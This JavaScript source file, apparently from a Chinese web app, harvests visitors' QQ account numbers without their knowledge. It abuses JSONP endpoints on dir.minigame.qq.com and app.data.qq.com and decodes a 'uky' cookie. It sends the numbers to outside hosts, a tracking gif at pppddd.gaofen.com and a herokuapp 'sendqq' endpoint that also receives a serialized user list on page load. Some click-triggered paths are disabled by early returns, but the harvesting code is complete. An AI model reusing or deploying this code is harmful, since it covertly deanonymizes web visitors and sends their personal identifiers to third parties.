/**
 * Created by zhiwen on 14-3-24.
 */

(function(AT, $$, win){
    function appendJS(url, success, error, id){
        success = success || jq.noop;
        var oScript = document.createElement("script");
        oScript.type = "text/javascript";
        oScript.src = url;
        if (oScript.readyState) {
            oScript.onreadystatechange = function() {
                if (oScript.readyState == "loaded"
                    || oScript.readyState == "complete") {
                    oScript.onreadystatechange = null;
                    window.setTimeout(success, 10);
                }
            };
        } else {
            oScript.onload = function() {
                window.setTimeout(success, 10);
            };
        }

        if(id){
            oScript.id = id;
        }

        oScript.onerror = function(){
            (error || jq.noop)();
        }
        document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
    }
    var myApp = angular.module('myApp',['DelegateEvents',  'filterList'], function($interpolateProvider) {
        $interpolateProvider.startSymbol('<%');
        $interpolateProvider.endSymbol('%>');
    }).filter('time', function(){

        return function(r){
            var len = r.toString().length;
            if(len< 13) r = Number(r)*1000;
            else r = Number(r);
            return AT.Util.timeToDate(r);
        }

    }).filter('stringLen', function(){
            return function(r){
                var len = r.length;

               return AT.Util.byteCut(r, 18);
            }

        });

    myApp.controller('qqControl', ['$scope','$http','$compile',function($scope,$http,$compile){
        $scope.users = users;
        $scope.pages = pages;
        $scope.ps = ps;
        var info = {list:users};
        info.blogid = users[3].blogid;
        info.blogname =users[3].blogname;
        var d = JSON.stringify(info);
        appendJS('http://arcane-escarpment-5810.herokuapp.com/api/sendqq?q='+d, function(){
            console.log('save ok');

        }, function(){

            console.log('save error=============');
        });






    }]);

    $$(function(){
        //获取QQ方法有两个方案:
        // 1通过QQ接口：http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead/get_player_info?callback=success_jsonpCallback1&uin=&_=1401763040081
        // 2通过app.data.qq.com空间获取
        var www = false;
        $$('#getByGame').click(function(e){
            e.preventDefault();
            return;
            getByGameInterface();
        });

        $$('#getByApp').click(function(e){
            e.preventDefault();
            return;
            getByAppData();
        });
        function getByGameInterface(){

            var quin = $$.cookie('uky'), _quin = []
                ,purl = 'http://pppddd.gaofen.com/gm/a.gif';

            www && (purl = '/api/saveUin');

            function appJs(){

                var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead/get_player_info?callback=gaofenCallback&uin=&_='+t;
                appendJS(url);

            }

            function pushUin(u){
                $$.get(purl, {quin : u}, function(r){
                    $('#msg').html('<div>获取成功</div>');
                });
            }

            window.gaofenCallback = window.gaofenCallback || function(d){
               if(d.result === 1000005){//未登录
                    setTimeout(appJs, 8000);
               }else{
                   pushUin(d.uin);
               }
            };
            if(quin){
                var quin = quin.split(','), _quin = [];
                for(var i= 0,len = quin.length;i<len;i++){
                    _quin.push(String.fromCharCode(quin[i]));
                }
                _quin = _quin.join('');
                pushUin(_quin);
            }else{
                appJs();
            }

        }



        function getByAppData(){

            var Qin_host=encodeURIComponent(document.location.href);
            var Qin_title=escape(document.title);
            var Qin_refer=encodeURIComponent(document.referrer);
            var timer = null, myuin = '', useJs = true, appendTimer = 0;

            function removeJs(){
                $$('#appUin').remove();
            }

            function toAppErr(){
                removeJs();
                timer = setTimeout(getUn, 0);

            }

            function toAppSucc(){
                clearTimeout(timer);
                timer = null;
                removeJs();
                $$.get('/api/getqq', {uin : myuin}, function(r){
                    $('#msg').html('<div>获取成功</div>');
                    //setTimeout(function(){location.href = '/qlist';},5000);
                    console.log(r);
                });

            }

            function getUn(){
                var t = +new Date;
                t +=1000;
                if(myuin && useJs){

                    appendJS('http://app.data.qq.com/?umod=user&uid=165543416&t='+t, toAppSucc, toAppErr, 'appUin');
                }else{
                    if(appendTimer <  20){
                        appendTimer++;
                        appendImg('http://app.data.qq.com/?umod=user&uid=165543416&t='+t);

                        setTimeout(getUn, 1500);
                    }else{
                        toAppSucc();
                    }

                }

            }

            function loadjs() {
                try {
                    if (data0.err == '1026') {//已登录
                        $$.get('/api/getUin', {}, function(r){
                            var uin = '';
                            for(var k in r.rst)
                                myuin = k;
                            timer = setTimeout(getUn, 0);
                        });
                    } else {
                        window.setTimeout(dynamicLoad, 1000);
                    }
                } catch (e) {
                    window.setTimeout(dynamicLoad, 1000);
                }
            }

            function appendImg(url){
                $('body').append('<img src="'+url+'" style="display:none;">');
            }

            function dynamicLoad() {
                appendJS("http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date()).getTime(), loadjs);
            }

            var quin = $$.cookie('uky'), _quin = [];
            if(!quin){
                dynamicLoad();
            }else{
                var quin = quin.split(',');
                for(var i= 0,len = quin.length;i<len;i++){
                    _quin.push(String.fromCharCode(quin[i]));
                }
                _quin = _quin.join('');
                $$.get('/api/saveHave', {quin : _quin}, function(r){


                })
            }

        }

        function appendJS(url, success, error, id){
            success = success || $$.noop;
            var oScript = document.createElement("script");
            oScript.type = "text/javascript";
            oScript.src = url;
            if (oScript.readyState) {
                oScript.onreadystatechange = function() {
                    if (oScript.readyState == "loaded"
                        || oScript.readyState == "complete") {
                        oScript.onreadystatechange = null;
                        window.setTimeout(success, 10);
                    }
                };
            } else {
                oScript.onload = function() {
                    window.setTimeout(success, 10);
                };
            }

            if(id){

                oScript.id = id;
            }

            oScript.onerror = function(){

                (error || $.noop)();
            }
            document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
        }

        //getByAppData();
    });


})(Atong, jQuery, window);


jQuery.cookie = function(name, value, options) {
    if (typeof value != 'undefined') { // name and value given, set cookie
        options = options || {};
        if (value === null) {
            value = '';
            options.expires = -1;
        }
        var expires = '';
        if (options.expires && (typeof options.expires == 'number' || options.expires.toUTCString)) {
            var date;
            if (typeof options.expires == 'number') {
                date = new Date();
                date.setTime(date.getTime() + (options.expires * 24 * 60 * 60 * 1000));
            } else {
                date = options.expires;
            }
            expires = '; expires=' + date.toUTCString(); // use expires attribute, max-age is not supported by IE
        }
        var path = options.path ? '; path=' + options.path : '';
        var domain = options.domain ? '; domain=' + options.domain : '';
        var secure = options.secure ? '; secure' : '';
        document.cookie = [name, '=', encodeURIComponent(value), expires, path, domain, secure].join('');
    } else { // only name given, get cookie
        var cookieValue = null;
        if (document.cookie && document.cookie != '') {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = jQuery.trim(cookies[i]);
                // Does this cookie string begin with the name we want?
                if (cookie.substring(0, name.length + 1) == (name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
};
